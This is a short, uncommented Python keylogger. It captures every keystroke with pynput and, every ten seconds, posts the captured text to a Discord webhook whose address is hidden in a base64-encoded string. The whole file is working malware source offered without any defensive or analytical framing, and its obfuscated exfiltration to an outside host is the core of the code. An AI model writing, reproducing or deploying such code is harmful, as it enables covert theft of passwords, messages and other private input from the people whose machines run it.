from pynput import keyboard
import requests, json, threading, base64, urllib.parse

text = ""
encoded_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE0NjI1MTI0ODI1ODAwMjk5NC9qejczYnNUZE5YcVB1c0xQNmstSjNkai1teFllZGFHZmIwVTB1LUtZSWJ6U055OUs0OWhIZ01fLVJKNWs4RjlNWndvUg=="
url = urllib.parse.unquote(base64.b64decode(encoded_url).decode('utf-8'))
time_interval = 10

def send_post_req():
    try:
        payload = {"content" : text}
        response = requests.post(url, json=payload)
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()
